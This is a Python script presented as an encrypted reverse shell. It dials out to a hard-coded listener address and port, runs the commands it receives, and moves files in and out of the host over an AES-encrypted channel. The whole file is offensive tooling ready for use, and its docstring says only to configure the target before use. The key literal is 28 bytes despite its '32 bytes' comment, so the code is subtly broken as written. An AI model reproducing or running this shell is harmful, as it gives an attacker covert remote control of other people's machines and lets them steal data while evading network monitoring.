#!/usr/bin/env python3
"""
Encrypted Reverse Shell with AES-256
Modern Python 3 reverse shell with encryption
Configure LHOST, LPORT, and KEY before use
"""

import socket
import subprocess
import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import threading
import sys

# Configuration
LHOST = "192.168.1.100"
LPORT = 4444
KEY = b"ThisIsA32ByteEncryptionKey!!"  # 32 bytes for AES-256

class EncryptedShell:
    def __init__(self, host, port, key):
        self.host = host
        self.port = port
        self.key = key
        self.cipher = AES.new(self.key, AES.MODE_CBC)
        
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = cipher.iv
        return base64.b64encode(iv + ct_bytes).decode()
    
    def decrypt(self, data):
        data = base64.b64decode(data)
        iv = data[:16]
        ct = data[16:]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode()
    
    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.send("Encrypted Shell Connected!")
            return True
        except Exception as e:
            return False
    
    def send(self, data):
        try:
            encrypted = self.encrypt(data)
            self.sock.send(encrypted.encode() + b"\n")
        except:
            pass
    
    def recv(self):
        try:
            data = self.sock.recv(4096).decode().strip()
            return self.decrypt(data)
        except:
            return None
    
    def run(self):
        if not self.connect():
            return
        
        while True:
            try:
                cmd = self.recv()
                if not cmd:
                    continue
                
                if cmd.lower() in ["exit", "quit"]:
                    self.send("Goodbye!")
                    break
                
                if cmd.startswith("cd "):
                    try:
                        os.chdir(cmd[3:])
                        self.send(f"Changed to: {os.getcwd()}")
                    except:
                        self.send("Directory not found")
                    continue
                
                if cmd == "download":
                    self.handle_download()
                    continue
                
                if cmd == "upload":
                    self.handle_upload()
                    continue
                
                # Execute command
                output = subprocess.getoutput(cmd)
                self.send(output)
                
            except Exception as e:
                self.send(f"Error: {str(e)}")
        
        self.sock.close()
    
    def handle_download(self):
        # File download functionality
        self.send("Download mode - send filename:")
        filename = self.recv()
        try:
            with open(filename, "rb") as f:
                data = base64.b64encode(f.read()).decode()
                self.send(f"FILE:{data}")
        except:
            self.send("ERROR:File not found")
    
    def handle_upload(self):
        # File upload functionality
        self.send("Upload mode - send filename:")
        filename = self.recv()
        self.send("Send file data (base64):")
        data = self.recv()
        try:
            with open(filename, "wb") as f:
                f.write(base64.b64decode(data))
                self.send("File uploaded successfully")
        except:
            self.send("ERROR:Upload failed")

if __name__ == "__main__":
    shell = EncryptedShell(LHOST, LPORT, KEY)
    shell.run()